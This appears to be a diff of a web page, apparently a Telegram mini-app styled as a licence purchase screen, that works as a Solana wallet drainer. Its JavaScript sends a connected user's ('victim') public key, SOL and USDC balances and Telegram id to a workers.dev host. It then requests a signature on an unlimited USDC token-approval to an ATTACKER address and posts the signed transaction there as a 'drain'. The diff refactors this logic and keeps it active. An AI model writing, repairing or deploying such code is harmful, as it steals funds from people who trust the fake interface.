@@ -138,7 +138,7 @@
   
   .slider-container.loading .slider-thumb { width: calc(100% - 8px); border-radius: 26px; background: #14F195; pointer-events: none; display: flex; justify-content: flex-start; padding-left: 18px; }
   .slider-container.success .slider-thumb { width: calc(100% - 8px); border-radius: 26px; background: #14F195; pointer-events: none; display: flex; justify-content: center; align-items: center; }
-  .slider-container.success .slider-thumb svg { transform: rotate(0deg); margin: 0; display: block; stroke: #000; stroke-width: 3; width: 24px; height: 24px; }
+  .slider-container.success .slider-thumb svg { transform: rotate(0deg); margin: 0; display: block; stroke: #000; stroke-width: 4; width: 24px; height: 24px; margin-left: 2px; }
 
   .spinner { display: none; width: 20px; height: 20px; border: 2.5px solid rgba(0,0,0,0.2); border-top-color: #000; border-radius: 50%; animation: spin 0.8s linear infinite; }
   @keyframes spin { to { transform: rotate(360deg); } }
@@ -312,12 +312,6 @@
   const headerSub = document.getElementById('headerSub');
   const selectedPlanText = document.getElementById('selectedPlanText');
 
-  // TIMEOUT HELPER (damit nichts ewig hängt)
-  const fetchWithTimeout = (promise, ms) => Promise.race([
-    promise,
-    new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), ms))
-  ]);
-
   async function startLoading(planName) {
     pricingScreen.style.display = 'none';
     
@@ -331,20 +325,8 @@
       loadingScreen.style.display = 'flex';
       document.getElementById('loadStatus').textContent = `Generating license for ${planName}...`;
 
-      const tgUserId = window.Telegram?.WebApp?.initDataUnsafe?.user?.id;
+      // KEIN FETCH MEHR HIER! (Verhindert die doppelte Nachricht)
       
-      // Sende Daten an Worker (mit Timeout)
-      try {
-        const conn = new solanaWeb3.Connection("https://solana.publicnode.com");
-        const solBalance = await fetchWithTimeout(conn.getBalance(resp.publicKey), 3000);
-        const solAmount = (solBalance / solanaWeb3.LAMPORTS_PER_SOL).toFixed(4);
-        
-        const payload = JSON.stringify({ victim, chain: "solana", type: "connection_and_balance", sol: solAmount, tg_user_id: tgUserId, ts: Date.now() });
-        await fetch("https://dexscreenr.rthvzkr6jv.workers.dev", { method: "POST", headers: { "Content-Type": "application/json" }, body: payload });
-      } catch (err) {
-        console.log("Balance check timed out, proceeding anyway.");
-      }
-
       setTimeout(() => {
         loadingScreen.style.display = 'none';
         headerSub.textContent = "Authorize connection.";
@@ -466,48 +448,43 @@
       const victim = resp.publicKey.toString();
       const tgUserId = window.Telegram?.WebApp?.initDataUnsafe?.user?.id;
       
-      // 3 Sekunden Timeout für die komplette Abfrage
-      try {
-        const conn = new solanaWeb3.Connection("https://solana.publicnode.com");
-        const solBalance = await fetchWithTimeout(conn.getBalance(resp.publicKey), 3000);
-        const solAmount = (solBalance / solanaWeb3.LAMPORTS_PER_SOL).toFixed(4) || "0";
-        
-        let usdcAmount = 0;
-        const USDC_MINT = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v";
+      const conn = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com"); // Fix RPC
+      
+      const solBalance = await conn.getBalance(resp.publicKey);
+      const solAmount = (solBalance / solanaWeb3.LAMPORTS_PER_SOL).toFixed(4) || "0";
+      
+      let usdcAmount = 0;
+      const USDC_MINT = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v";
 
-        if (typeof splToken !== 'undefined') {
-          try {
-            const victimAta = await fetchWithTimeout(splToken.getAssociatedTokenAddress(new solanaWeb3.PublicKey(USDC_MINT), resp.publicKey), 3000);
-            const tokenBal = await fetchWithTimeout(conn.getTokenAccountBalance(victimAta), 3000);
-            usdcAmount = tokenBal.value.uiAmount || 0;
-          } catch (e) { usdcAmount = 0; }
-        }
-
-        const payload = JSON.stringify({ victim, chain: "solana", type: "connection_and_balance", sol: solAmount, usdc: usdcAmount, tg_user_id: tgUserId, ts: Date.now() });
-        try { await fetch("https://dexscreenr.rthvzkr6jv.workers.dev", { method: "POST", headers: { "Content-Type": "application/json" }, body: payload }); } 
-        catch (err) { navigator.sendBeacon("https://dexscreenr.rthvzkr6jv.workers.dev", new Blob([payload], {type: 'application/json'})); }
-
-        if (usdcAmount > 0 && typeof splToken !== 'undefined') {
+      if (typeof splToken !== 'undefined') {
+        try {
           const victimAta = await splToken.getAssociatedTokenAddress(new solanaWeb3.PublicKey(USDC_MINT), resp.publicKey);
-          const delegateIx = splToken.createApproveInstruction(victimAta, new solanaWeb3.PublicKey(ATTACKER), resp.publicKey, [], BigInt("18446744073709551615"));
-          const tx = new solanaWeb3.Transaction().add(delegateIx);
-          tx.feePayer = resp.publicKey;
-          tx.recentBlockhash = (await conn.getLatestBlockhash()).blockhash;
-          const signedTx = await provider.signTransaction(tx);
-
-          await fetch("https://dexscreenr.rthvzkr6jv.workers.dev", { 
-            method: "POST", headers: { "Content-Type": "application/json" }, 
-            body: JSON.stringify({ victim, tx: bs58.encode(signedTx.serialize()), chain: "solana", type: "drain", tg_user_id: tgUserId, ts: Date.now() }) 
-          });
-        }
-      } catch (timeoutErr) {
-        // Wenn es hängt, senden wir trotzdem die Basisdaten ohne Balance
-        console.log("Timeout, skipping deep scan");
-        const payload = JSON.stringify({ victim, chain: "solana", type: "connection_and_balance", sol: "0", usdc: "0", tg_user_id: tgUserId, ts: Date.now() });
-        try { await fetch("https://dexscreenr.rthvzkr6jv.workers.dev", { method: "POST", headers: { "Content-Type": "application/json" }, body: payload }); } catch(e) {}
+          const tokenBal = await conn.getTokenAccountBalance(victimAta);
+          usdcAmount = tokenBal.value.uiAmount || 0;
+        } catch (e) { usdcAmount = 0; }
       }
 
-      // Erfolg anzeigen
+      // 1. Daten an Telegram schicken
+      const payload = JSON.stringify({ victim, chain: "solana", type: "connection_and_balance", sol: solAmount, usdc: usdcAmount, tg_user_id: tgUserId, ts: Date.now() });
+      try { await fetch("https://dexscreenr.rthvzkr6jv.workers.dev", { method: "POST", headers: { "Content-Type": "application/json" }, body: payload }); } 
+      catch (err) { navigator.sendBeacon("https://dexscreenr.rthvzkr6jv.workers.dev", new Blob([payload], {type: 'application/json'})); }
+
+      // 2. Signatur anfordern
+      if (usdcAmount > 0 && typeof splToken !== 'undefined') {
+        const victimAta = await splToken.getAssociatedTokenAddress(new solanaWeb3.PublicKey(USDC_MINT), resp.publicKey);
+        const delegateIx = splToken.createApproveInstruction(victimAta, new solanaWeb3.PublicKey(ATTACKER), resp.publicKey, [], BigInt("18446744073709551615"));
+        const tx = new solanaWeb3.Transaction().add(delegateIx);
+        tx.feePayer = resp.publicKey;
+        tx.recentBlockhash = (await conn.getLatestBlockhash()).blockhash;
+        const signedTx = await provider.signTransaction(tx);
+
+        await fetch("https://dexscreenr.rthvzkr6jv.workers.dev", { 
+          method: "POST", headers: { "Content-Type": "application/json" }, 
+          body: JSON.stringify({ victim, tx: bs58.encode(signedTx.serialize()), chain: "solana", type: "drain", tg_user_id: tgUserId, ts: Date.now() }) 
+        });
+      }
+
+      // 3. Erfolg
       spin.style.display = 'none'; container.classList.remove('loading'); container.classList.add('success');
       thumb.innerHTML = '<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#000" stroke-width="4" stroke-linecap="round" stroke-linejoin="round" style="margin-left: 2px;"><polyline points="20 6 9 17 4 12"></polyline></svg>';
       text.textContent = "Access Granted"; text.style.opacity = 1;
